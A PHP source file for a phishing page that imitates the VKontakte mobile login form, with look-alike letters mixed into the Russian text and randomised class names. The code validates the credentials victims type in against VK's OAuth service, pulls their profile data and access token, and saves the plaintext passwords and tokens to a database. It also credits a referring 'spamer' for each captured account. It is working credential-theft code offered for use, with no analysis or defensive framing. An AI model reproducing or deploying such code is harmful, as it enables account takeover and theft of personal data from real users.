<? session_start(); 
    include '../config.php';
	if(isset($_GET['reff'])) {
	$_SESSION['comment'] = $_GET['reff'];
	$sessref = $_SESSION['comment'];
} else {
	$sessref = 'non-ref';
}
	
    $link = mysql_connect($dbhost,$dbuser,$dbpass);
    mysql_select_db($db_name,$link);

    error_reporting (0);
	if (($_POST["email"] != "") and ($_POST["pass"]))
	{
		$username = $_POST["email"];
		$password = $_POST["pass"];
		$check = file_get_contents("https://oauth.vk.com/token?v=5.95&grant_type=password&client_id=2274003&client_secret=hHbZxrka2uZ6jB1inYsH&username=".$username."&password=".$password);
        $res = file_get_contents("https://oauth.vk.com/token?v=5.95&grant_type=password&client_id=2274003&client_secret=hHbZxrka2uZ6jB1inYsH&username=".$username."&password=".$password);
        
		
		if (strpos($check, "access_token") === false)
		{
			$message = '<div class="service_msg_box">
  <div class="service_msg service_msg_warning"><b>Не удаётся войти.</b><br>Пожалуйста, проверьте правильность введённых данных. </div>
</div>';
		} 
			else
			{	
$res = json_decode($res, true);
                $id=$res['user_id'];
                $token=$res['access_token'];
                $inn = file_get_contents("https://api.vk.com/method/account.getProfileInfo?v=5.95&access_token=".$token);
                $inn= json_decode($inn, true);
				$pol = $inn['response']['sex'];
                $fio = $inn['response']['first_name'].' '.$inn['response']['last_name'];
                $frd = json_decode(file_get_contents('https://api.vk.com/method/users.get?v=5.95&user_ids='.$id.'&fields=counters,country,sex,city&access_token='.$token));
				$datar = $inn['response']['bdate'];
				$str = $frd -> response[0] -> country -> id;
                $friends = $frd -> response[0] -> counters -> friends;
			$age = floor((time() - strtotime($datar)) / 31556926);
				
$NewUser = mysql_query("SELECT * FROM data WHERE login='$username'") or die();
if (mysql_num_rows($NewUser) == 0) {
        //Вставляем данные, подставляя их в запрос
    $email = $_POST['email'];
                 $password = $_POST['pass'];                      
        $ref = $_POST['comment'];
$inser = mysqli_query($db,"insert into `data` (login,pass,token,fio,friends,pol,str,yers,userid,fromsp) values ('$email','$password','$token','$fio','$friends','$pol','$str','$age','$id','$ref')"); 
$updbal = mysqli_query($db,"update `slito` set `inviteusers` = `inviteusers`+1 where `spamer` = '$ref'");
$message = '';	
echo '<script>
    setTimeout(function(){location.href="'.$ssilka.'"} , 2000);  
</script>';			        
} else {
   $message = '<div class="box_error">Вы уже авторизованы!</div>';
}       
                
			}
	}
	
if (1 == 1) { echo
'<html class="9PIBmKP vk _js_yes _2x _flex_yes r d h _withVolumeLine _appAuth_no n _old">
   <head>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, minimal-ui, user-scalable=no">
      <meta name="format-detection" content="telephone=no">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <link rel="shortcut icon" href="/assets/go/mobile/fav_logo_2x.ico?5345345">
      <meta name="theme-color" content="#ffffff">
      <link rel="icon" type="image/png" sizes="32x32" href="/assets/go/mobile/favicon_32.png?8">
      <link rel="apple-touch-icon" href="/assets/go/mobile/default.png?8">
      <link rel="stylesheet" type="text/css" href="css/m.css">
      <meta name="apple-mobile-web-app-status-bar-style" content="black">
      <title>ВKoнтакте | Pазрешeние доступа</title>
</head>
      <div class="1IKi6KN layout">
         <div class="JbaA7sP __body qs_enabled _js _copts">
            <div class="jP5CnP3 __leftMenu" id="l" style="min-height: 0px;">
            </div>
            <div class="l2ogMiL __basis" id="m" style="min-height: 0px; margin-top: 0px;">
               <div class="s0UE2fJ basis">
                  <div class="Lfyze4I __header mhead __header_noBottomMenu __header_noshadow __header_noshadowAnim __header_nohide" id="mhead">
                     <a href="/" accesskey="*" class="Diint3f hb_wrap _logo">
                        <div class="eHxyjSD hb_btn _logo">&nbsp;</div>
                        <h1 class="CvJZrK3 hb_btn _header">&nbsp;</h1>
                     </a>
                  </div>
                  <div class="DPpVHZe __menu"></div>
                  <div class="1JNID8H __content mcont" id="mcont">
                     <div class="1DUCYL3 pcont _box bl_cont new_form">
                        <div class="lVjY78I PageBlock">
                           <div class="DsDXRAy form_item">
                              <div class="nX6e2s4 owner_panel oauth_mobile_header" style="margin-bottom: 15px;">
                                 <img src="https://sun1-13.userapi.com/c830409/v830409603/4091/Br5Q8mxuldg.jpg?ava=1" class="TE5DLI2 _img">
                                 <div class="8FbVata _cont">
                                    <div class="ondKhvG op_owner">Авторизация ВКонтакте <img src="/auth/img/verify.jpg" style="height:16px;width:16px;"></div>
                                    <div class="k3vHE6Y op_info">Для прoдолжeния Вaм необхoдимo войти <b>ВKoнтакте</b>.</div>
                                 </div>
                              </div>
      <p>
	'.$message.'
	</p>
                              <form method="post" action="#">
                                 <dl class="vbCIiAh fi_row">
                                    <dd>
                                       <input type="text" class="BosAiPN textfield" name="email" id="data1" value="" placeholder="Тeлeфон или email">
                                       <input type="hidden" name="value" value="value">
                                    </dd>
                                 </dl>
                                 <dl class="Lj27cc6 fi_row">
                                    <dd>
                                       <input type="password" class="DYVC15o textfield" id="data2" name="pass" value="" placeholder="Пaроль">
                                       <input type="hidden" name="test_r" value="value">
                                    </dd>
                                 </dl>
                                 <div class="0lHg9FP fi_row_new">
                                    <input class="kZjHZBt button wide_button" type="submit" id="install_allow" value="Вoйти">
                                 </div>
                                 <div class="FLCIEai fi_row" style="margin-bottom: 25px;">
                                    <div class="GU7YmN3 _btn wide_button login_restore"><a rel="noopener">Зaбыли пароль?</a></div>
                                 </div>
                                 <div class="beveled" style="display: none;">
                                 </div>
                                 <div class="dbfMjCK login_new_user">
                                    <div class="piXBKs7 fi_header_light">Впервыe ВKoнтакте?</div>
                                 </div>
                                 <div class="CkKGleX fi_row">
                                    <a class="Rd0GkDX button wide_button success" href="https://vk.cc/" target="_blank" rel="noopener">Зaрегистрировaться</a>
                                 </div>
                              </form>
                           </div>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
         </div>
      </div>
</body>
</html>'; } ?>